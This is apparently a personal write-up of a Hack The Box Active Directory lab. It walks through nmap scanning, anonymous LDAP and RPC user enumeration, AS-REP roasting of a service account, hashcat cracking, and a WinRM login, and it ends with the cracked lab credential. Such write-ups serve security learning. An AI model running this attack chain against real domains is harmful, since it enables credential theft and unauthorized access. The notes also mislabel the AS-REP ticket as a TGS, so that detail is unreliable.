# Enumeration

## Nmap
Scan open ports
```bash
nmap -sC -sV -A -oA nmap/scan.txt 10.129.211.144

Nmap scan report for 10.129.211.144
Host is up (0.0081s latency).                
Not shown: 989 closed tcp ports (reset)                 
PORT     STATE SERVICE      VERSION            
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-25 20:24:35Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped     
```
the domain is `htb.local` 
## Ladapsearch Users Enum
Check if the LDAP service allow anonymous authentication
```bash
ldapsearch -H LDAP://10.129.211.144 -x -s base namingcontexts
```

![[Pasted image 20250525232229.png]]

The `namingcontexts` attribute lists the **base Distinguished Name (DNs)** of all **naming contexts** that the LDAP server knows about.

Think of naming context as **entry point or "root containers"** in the LDAP directory tree where different categories of data are stored. Each one represents different **subtree** of the directory

So in now we can query the context of `htb` and  `local` **root containers**.

### Create a users list with ldapsearch
We can retrieve a users list with this query and save that in a file
```bash
ldapsearch -H LDAP://10.129.211.144 -x -b 'DC=htb,DC=local' '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > users_list
```

- `-x`: this flags enable anonymous authentication
- `-b`: this flags specified the "root containers" where preform the LDAP query.

`awk '{print $2}'` means take only the second column of the output.

Clear the list of the useless name like name machine default users etc..

Clear user list
![[Pasted image 20250525234215.png]]


## Rpcclient 
I try to enumerate the users with anonymous authentication of smb protocol, in this case i use `rpcclient`:

```bash
rpcclient -U "" -N 10.129.211.144
```

enum the domain's users with `enumdomusers`
![[Pasted image 20250526014820.png]]

i founded a new users `svc-alfresco`... if i query the user rid i notice is a member of `Domain Users` and `Service Accounts`... this make me think that it's a **service users**.
![[Pasted image 20250526015139.png]]

Infect if i run again a LDAP query but without specify the **objectClass** and search "svc" keyword i see this is a **Service Account**.

```bash
ldapsearch -H LDAP://10.129.211.144 -x -b "DC=htb,DC=local" | grep -i "svc"
```

![[Pasted image 20250526015927.png]]

## Foothold
Searching on internet i find the [official documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/#kerberos-and-active-directory) where there is specify "**Do not require Kerberos preauthentication**" enable in the Configuration steps
![[Pasted image 20250526022339.png]]
This means we can utilize the [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.211.144 -no-pass -format hashcat
```

![[Pasted image 20250526023233.png]]

Now i have the TGS i can try to crack that offline using hashcat and module `18200`
```bash
hashcat -m 18200 alfresco_TGS /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250526023704.png]]

Try to connect on the machine with this credential.. i try with `smb` protocol the credential are correct but the machine is not pwned so i try check if the `winrm` port (5985 5986) are opens on the target 
```nmap
nmap -p 5985 5986 10.129.211.144
```

![[Pasted image 20250526024319.png]]
The 5985 is open this mean we can try to connect with `winrm` protocol using `crackmapexec`
```bash
crackmapexec winrm 10.129.211.144 -u 'svc-alfresco' -p 's3rvice' -X 'whoami'
```

![[Pasted image 20250526024505.png]]


## Loot

| User                   | Password | Notes        |
| ---------------------- | -------- | ------------ |
| svc-alfresco@HTB.LOCAL | s3rvice  | Service User |
